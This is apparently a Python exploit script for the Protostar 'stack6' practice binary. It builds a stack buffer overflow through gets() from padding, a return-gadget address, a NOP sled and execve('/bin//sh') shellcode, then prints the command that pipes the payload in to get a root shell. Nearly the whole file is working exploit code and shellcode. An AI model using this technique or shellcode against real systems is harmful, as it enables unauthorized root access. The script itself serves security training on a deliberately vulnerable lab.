# very similar to stack5, exploiting gets()
# using a NOP gadget to get around _builtin_return_address check and overflow the same way as in stack5
# return to .text exploit

import struct

padding = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" #add 4 bytes to account for unsigned int

ret = struct.pack("I", 0x080484f9) #ret address in getpath() --> NOP gadget (return oriented programming)
eip = struct.pack("I", 0xbffff6ac+50) #overflow eip at ret instruction with address of stack pointer (esp) + offset

nopslide = "\x90"*1000

payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

file = open("exp", "w")
file.write(padding + ret + eip + nopslide + payload)
file.close()

print "Use following command to open root shell:"
print "(cat exp ; cat) | /opt/protostar/bin/stack6"
print "Then use 'id' or 'whoami' to verify root"

#modern operating systems should be protected from this by W^X --> Data Execution Prevention (DEP)
